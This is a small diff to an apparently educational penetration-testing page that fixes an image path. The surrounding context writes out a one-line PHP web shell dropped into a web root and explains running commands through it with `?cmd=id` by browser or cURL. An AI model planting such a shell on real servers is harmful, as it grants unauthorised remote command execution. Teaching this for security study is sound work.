@@ -291,7 +291,7 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
 Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Another option is to use `cURL`:
 
